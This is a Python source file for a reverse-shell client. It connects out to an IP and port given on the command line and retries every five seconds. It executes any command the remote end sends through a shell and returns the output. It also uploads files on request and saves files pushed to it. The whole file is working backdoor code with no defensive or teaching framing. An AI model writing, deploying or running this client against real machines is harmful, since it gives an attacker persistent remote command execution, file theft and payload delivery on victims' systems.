import socket
import time
import threading
import subprocess
import os
import sys

class Client:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.s = None
        self.send_lock = threading.Lock()

    def send_msg(self, msg_str):
        try:
            msg_bytes = msg_str.encode('utf-8')
            msg_len = len(msg_bytes).to_bytes(4, "big")
            with self.send_lock:
                self.s.sendall(msg_len + msg_bytes)
        except:
            pass

    def recv_exact(self,n):
        data = b""
        while len(data) < n:
            chunk = self.s.recv(n - len(data))
            if not chunk:
                raise ConnectionError("Connection closed")
            data += chunk
        return data

    def recv_msg(self):
        size_bytes = self.recv_exact(4)
        msg_size = int.from_bytes(size_bytes, 'big')
        data = self.recv_exact(msg_size)
        return data.decode('utf-8')
    
    def send_file(self, filename):
        try:
            if not os.path.exists(filename):
                self.send_msg(f"[-] File not found: {filename}")
                return
            filesize = os.path.getsize(filename)
            basename = os.path.basename(filename)
            self.send_msg(f"FILE:{basename}:{filesize}")

            with open(filename, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    with self.send_lock:
                        self.s.sendall(chunk)
        except Exception as e:
            self.send_msg(f"[-] Failed to send {filename}: {e}")

    def recv_file(self, header, save_folder="."):
        try:
            _, filename, filesize = header.split(":")
            filesize = int(filesize)
            filepath = os.path.join(save_folder, os.path.basename(filename))
            with open(filepath, "wb") as f:
                remaining = filesize
                while remaining > 0:
                    chunk = self.s.recv(min(4096, remaining))
                    if not chunk:
                        raise ConnectionError("connection closed during file transfer")
                    f.write(chunk)
                    remaining -= len(chunk)
            self.send_msg(f"[+] File saved as {filepath}")
        except Exception as e:
            self.send_msg(f"[-] Error receiving file: {e}")
            return

            
    
    def execute(self, cmd):
        cmd = cmd.strip()
        if not cmd:
            return
        
        if cmd.lower().startswith("cd "):
            try:
                target_dir = cmd[3:].strip()
                os.chdir(target_dir)
                self.send_msg(f"Changed directory to {os.getcwd()}")
            except Exception as e:
                self.send_msg(f"Error: {e}")
            return

        if cmd.startswith("req_file "):
            filename = cmd[9:].strip()
            if os.path.exists(filename):
                self.send_file(filename)
            else:
                self.send_msg(f"[-] File not found: {filename}")
            return
            
                    
        # Execute shell command
        try:
            proc = subprocess.Popen(cmd,
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            output, err = proc.communicate()
            output = output.decode(errors='replace') if output else ""
            err = err.decode(errors='replace') if err else ""
            self.send_msg(output + err)
        except FileNotFoundError:
            self.send_msg("No such file or directory")
        except Exception as e:
            self.send_msg(f"Error: {e}")

    def listen(self):
        while True:
            try:
                command = self.recv_msg()
                if command.startswith("FILE"):
                    self.recv_file(command)
                    continue
                else:
                    t = threading.Thread(target=self.execute, args=(command,))
                    t.daemon = True
                    t.start()
            except ConnectionError:
                break
            

    def connect_loop(self):
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.server_ip, self.server_port))
                self.listen()
            except:
                time.sleep(5)
            finally:
                try:
                    self.s.close()
                except:
                    pass
    

if __name__ == "__main__":
    ip = sys.argv[1]
    port = int(sys.argv[2])
    client = Client(ip, port)
    client.connect_loop()